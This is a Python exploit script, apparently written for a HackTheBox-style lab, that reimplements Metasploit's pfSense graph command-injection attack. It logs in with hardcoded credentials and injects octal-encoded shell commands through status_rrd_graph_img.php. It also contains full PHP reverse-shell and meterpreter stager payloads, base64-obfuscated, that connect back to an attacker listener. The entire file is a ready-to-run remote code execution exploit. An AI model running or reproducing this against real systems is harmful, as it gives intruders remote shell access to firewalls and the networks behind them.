#!/usr/bin/env python

import re
import sys
import base64
import requests
import urllib.parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
Python implementation of pfsense_graph_injection_exec from metasploit framework.
There isn't a master-branch version of the exploit yet, so instead of porting or
checking out my msf, I just decided to do a rewrite.
"""

usage_string = """
[-] improper usage.
[*] format like so:
	$ python sense_rce.py [proxy] [payload type]

	[proxy]:	(p)		you would like to proxy the connection though localhost:31337
	[payload type]	(nc : msf)	which payload you would like to use
		[nc]:	catch with 'nc -lvp PORT'
		[msf]:	catch with metasploit handler (exploit/multi/handler)
"""
username = 		"rohit"
password = 		"pfsense"
listener_ip = 	"10.10.14.14"
listener_port = "1337"
target_ip = "10.10.10.60"
url = "https://{}/".format(target_ip)
proxied_url = "https://127.0.0.1:31337/"
headers = {
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate",
	"Referer": "https://{}/index.php".format(target_ip)
}
exploit_filename = "WHOOPSHACKED"
payload = None
# string needles: $ip = 'ATTACK3RIP'; $port = ATTACK3RP0RT
# php/meterpreter/reverse_tcp
meterpreter_stager = """/*<?php /**/ error_reporting(0); $ip = 'ATTACK3RIP'; $port = ATTACK3RP0RT; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();"""
# php/reverse_php
php_reverse_shell = """/*<?php /**/
  @error_reporting(0);
  @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
  $dis=@ini_get('disable_functions');
  if(!empty($dis)){
    $dis=preg_replace('/[, ]+/', ',', $dis);
    $dis=explode(',', $dis);
    $dis=array_map('trim', $dis);
  }else{
    $dis=array();
  }
  
$ipaddr='ATTACK3RIP';
$port=ATTACK3RP0RT;

if(!function_exists('ecBpMyXNCI')){
  function ecBpMyXNCI($c){
    global $dis;
    
  if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
    $c=$c." 2>&1\n";
  }
  $gXDJVwq='is_callable';
  $uDUaFQF='in_array';
  
  if($gXDJVwq('proc_open')and!$uDUaFQF('proc_open',$dis)){
    $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
    $o=NULL;
    while(!feof($pipes[1])){
      $o.=fread($pipes[1],1024);
    }
    @proc_close($handle);
  }else
  if($gXDJVwq('popen')and!$uDUaFQF('popen',$dis)){
    $fp=popen($c,'r');
    $o=NULL;
    if(is_resource($fp)){
      while(!feof($fp)){
        $o.=fread($fp,1024);
      }
    }
    @pclose($fp);
  }else
  if($gXDJVwq('shell_exec')and!$uDUaFQF('shell_exec',$dis)){
    $o=shell_exec($c);
  }else
  if($gXDJVwq('passthru')and!$uDUaFQF('passthru',$dis)){
    ob_start();
    passthru($c);
    $o=ob_get_contents();
    ob_end_clean();
  }else
  if($gXDJVwq('system')and!$uDUaFQF('system',$dis)){
    ob_start();
    system($c);
    $o=ob_get_contents();
    ob_end_clean();
  }else
  if($gXDJVwq('exec')and!$uDUaFQF('exec',$dis)){
    $o=array();
    exec($c,$o);
    $o=join(chr(10),$o).chr(10);
  }else
  {
    $o=0;
  }

    return $o;
  }
}
$nofuncs='no exec functions';
if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
  $s=@fsockopen("tcp://ATTACK3RIP",$port);
  while($c=fread($s,2048)){
    $out = '';
    if(substr($c,0,3) == 'cd '){
      chdir(substr($c,3,-1));
    } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
      break;
    }else{
      $out=ecBpMyXNCI(substr($c,0,-1));
      if($out===false){
        fwrite($s,$nofuncs);
        break;
      }
    }
    fwrite($s,$out);
  }
  fclose($s);
}else{
  $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
  @socket_connect($s,$ipaddr,$port);
  @socket_write($s,"socket_create");
  while($c=@socket_read($s,2048)){
    $out = '';
    if(substr($c,0,3) == 'cd '){
      chdir(substr($c,3,-1));
    } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
      break;
    }else{
      $out=ecBpMyXNCI(substr($c,0,-1));
      if($out===false){
        @socket_write($s,$nofuncs);
        break;
      }
    }
    @socket_write($s,$out,strlen($out));
  }
  @socket_close($s);
}"""
base64_rounds = 2

"""
generates a php reverse shell payload that is 
"""
def generate_payload():
	print("[*] generating obfuscated/encoded reverse shell payload for {}:{}".format(
		listener_ip, listener_port))
	current_payload = php_reverse_shell.replace("ATTACK3RIP", listener_ip).replace("ATTACK3RP0RT", listener_port).replace("\n", "")
	for i in range(0, base64_rounds):
		encoded_round = base64_encode_payload(current_payload)
		current_payload = "eval(base64_decode({}));".format(encoded_round)
		reverse_payload = "print(base64_decode({}));".format(encoded_round)
	final_payload = "echo '<?php {} ?>' > {}".format(current_payload, exploit_filename)
	global payload
	payload = final_payload
	print("\t[+] generated obfuscated/encoded payload")

def base64_encode_payload(unencoded_payload):
	encoded_payload = base64.b64encode(unencoded_payload.encode('ascii'))
	# remove trailing '=' padding...this is necessary in python, but the
	# PHP base64 encoder/decoder doesn't care about padding. In fact, 
	# extraneous padding from python encoding can break PHP decoding
	encoded_payload = encoded_payload.decode('utf-8')
	if encoded_payload[-1] == "=":
		return encoded_payload.replace("=", "") # if we have more than 1 =
	return encoded_payload

def octal_encode_payload(raw_payload):
	print("[*] octal encoding payload")
	encoded_payload = ""
	for c in raw_payload:
		octal_char = "{}".format((oct(ord(c)))).replace("0o","0")
		if len(octal_char) > 3:
			octal_char = octal_char[1:]
		if octal_char[0] == "0":
			octal_char = octal_char[1:]
		leading_slashes = "\{}".format("")
		encoded_char = "{}{}".format(leading_slashes, octal_char)
		encoded_payload += encoded_char
	print("\t[+] encoding complete\n")
	return encoded_payload


def get_csrf_token_and_cookie_test(response_text, end_char=";"):
	csrf_re = r"(sid:[0-9a-f]+),([0-9]+)"
	pre_stub = """name='__csrf_magic' value=\""""
	csrf_token = re.search(csrf_re, response_text).group(0)
	print("\t[+] grabbed CSRF token: {}".format(csrf_token))
	return str(csrf_token)

def login():
	print("[+] authenticating to firewall with ({}:{})".format(username, password))
	exploit_session = requests.Session()
	login_url = "{}{}".format(url, "index.php")
	r = exploit_session.get(login_url, headers=headers, verify=False, allow_redirects=False)
	assert(r.status_code == 200)
	csrf_token= get_csrf_token_and_cookie_test(r.text)
	l = exploit_session.post(
		login_url,
		data={
			"__csrf_magic": csrf_token,
			"usernamefld":username,
			"passwordfld":password,
			"login":"Login"
		},
		verify=False, 
	)
	if l.status_code == 200 and "Username" not in l.text:
		print("\t[+] authentication successful!")
		next_csrf_token = get_csrf_token_and_cookie_test(l.text)
		return exploit_session, next_csrf_token
	else:
		if l.status_code == 403 and "CSRF" in l.text:
			print("\t[-] authentication failed (incorrect CSRF token [{}])".format(csrf_token))
		else:
			print("\t[-] authentication failed ({})".format(l.status_code))
		exit(0)

"""
exploit/unix/http/pfsense_graph_injection_exec
"""
def exploit_graph(exploit_session, next_csrf_token):
	# inject the payload into the server
	octal_payload = octal_encode_payload(payload)
	graph_command = "file|printf '{}'|sh|echo".format(octal_payload)
	graph_command = urllib.parse.quote_plus(graph_command).replace("+", "%20").replace("%5C", "\\")
	injection_params = "?database=-throughput.rrd&graph={}".format(graph_command)
	exploit_url = "{}{}".format(url, "status_rrd_graph_img.php")
	exploit_url_plus_params = "{}{}".format(exploit_url, injection_params)
	print("[*] injecting into {}".format(exploit_url))
	e = exploit_session.get(
		exploit_url_plus_params,
		allow_redirects=False,
		verify=False,
	)
	if e.status_code == 200:
		print("\t[+] exploit code injected successfully")
			
	elif e.status_code != 200:
		print("\t[-] payload injection failed ({})".format(e.status_code))
		exit(0)

	# trigger the exploit
	#next_csrf_token = get_csrf_token_and_cookie_test(e.text)
	print("[*] triggering the exploit (make sure to catch on {}:{})".format(listener_ip, listener_port))
	graph_command = "file|php {}|echo ".format(exploit_filename)
	graph_command = urllib.parse.quote_plus(graph_command).replace("+", "%20")
	trigger_params = "?database=-throughput.rrd&graph={}".format(graph_command)
	trigger_url = "{}{}{}".format(url, "status_rrd_graph_img.php", trigger_params)
	t = exploit_session.get(
		trigger_url,
		allow_redirects=False,
		verify=False
	)
	if e.status_code == 200:
		print("\t[+] exploitation complete")
	elif e.status_code != 200:
		print("\t[-] exploitation failed ({})".format(e.status_code))
		exit(0)

def main():
	if len(sys.argv) < 1:
		print(usage_string)
		exit(0)

	if "proxy" in sys.argv:
		global url, proxied_url
		url = proxied_url
		print("[*] using proxied_url ({})".format(url))
	if "msf" in sys.argv or "nc" in sys.argv:
		global php_reverse_shell, meterpreter_stager
		if "msf" in sys.argv:
			php_reverse_shell = meterpreter_stager
			print("[*] setting payload to meterpreter stager (need to catch with exploit/multi/handler)")
		elif "nc" in sys.argv:
			print("[*] setting payload to nc reverse shell (catch with 'nc -lvp PORT')")
	else:
		print("[!] please select a payload type")
		print(usage_string)
		exit(0)

	print("[*] exploiting pfsense_graph_injection_exec")
	try:
		generate_payload()
		exploit_session, next_csrf_token = login()
		exploit_graph(exploit_session, next_csrf_token)
	except KeyboardInterrupt as ke:
		print("\n[!] keyboard interrupt detected. exiting...")
	print("[+] done")

if __name__ == "__main__":
	main()





